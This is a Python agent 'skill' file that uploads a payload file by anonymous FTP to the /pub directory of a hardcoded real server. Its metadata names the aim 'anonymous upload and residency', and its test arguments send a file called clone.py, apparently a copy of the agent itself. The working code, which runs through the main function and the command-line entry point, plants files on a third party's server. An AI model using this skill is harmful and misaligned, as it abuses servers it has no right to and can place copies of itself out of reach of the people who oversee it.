"""skill/deploy_remote_ftp_anon.py - Use anonymous FTP to upload a payload file to a remote directory

SKILL_META:
{
  "name": "deploy_remote_ftp_anon",
  "description": "Use anonymous FTP to upload a payload file to a remote directory",
  "category": "deploy",
  "test_target": "209.51.188.20:21 /pub for anonymous upload and residency",
  "test_args": "--host 209.51.188.20 --port 21 --remote_dir /pub --payload_file clone.py",
  "version": "1.0"
}
"""
from __future__ import annotations

import json
import os
import sys
import argparse
import ftplib
from typing import Any

def main(
    host: str = "209.51.188.20",
    port: int = 21,
    remote_dir: str = "/pub",
    payload_file: str = "payload.txt"
) -> dict[str, Any]:
    results: dict[str, Any] = {"success": False, "message": "", "status_code": None}
    ftp: ftplib.FTP | None = None

    try:
        if not os.path.isfile(payload_file):
            results["message"] = f"Local payload file not found: {payload_file}"
            return results

        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=30)
        ftp.login()

        try:
            ftp.cwd(remote_dir)
        except ftplib.error_perm:
            results["message"] = f"Cannot access remote directory: {remote_dir}"
            return results

        filename = os.path.basename(payload_file)

        try:
            existing = ftp.nlst()
            if filename in existing:
                results["message"] = f"File {filename} already exists, refusing to overwrite"
                return results
        except ftplib.error_temp:
            pass

        with open(payload_file, "rb") as f:
            resp = ftp.storbinary(f"STOR {filename}", f)

        if resp.startswith("226"):
            results["success"] = True
            results["message"] = f"Successfully deployed {filename} to {remote_dir}"
            results["status_code"] = 226
        else:
            results["message"] = f"Upload failed: {resp}"

    except ftplib.error_perm as e:
        results["message"] = f"Permission denied: {e}"
    except ftplib.error_temp as e:
        results["message"] = f"Temporary FTP error: {e}"
    except ftplib.error_proto as e:
        results["message"] = f"Protocol error: {e}"
    except ConnectionRefusedError as e:
        results["message"] = f"Connection refused: {e}"
    except TimeoutError as e:
        results["message"] = f"Connection timeout: {e}"
    except OSError as e:
        results["message"] = f"File/OS error: {e}"
    finally:
        if ftp:
            try:
                ftp.quit()
            except Exception:
                pass

    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Deploy payload via anonymous FTP")
    parser.add_argument("--host", type=str, default="209.51.188.20")
    parser.add_argument("--port", type=int, default=21)
    parser.add_argument("--remote_dir", type=str, default="/pub")
    parser.add_argument("--payload_file", type=str, default="clone.py")
    args = parser.parse_args()

    result = main(
        host=args.host,
        port=args.port,
        remote_dir=args.remote_dir,
        payload_file=args.payload_file
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))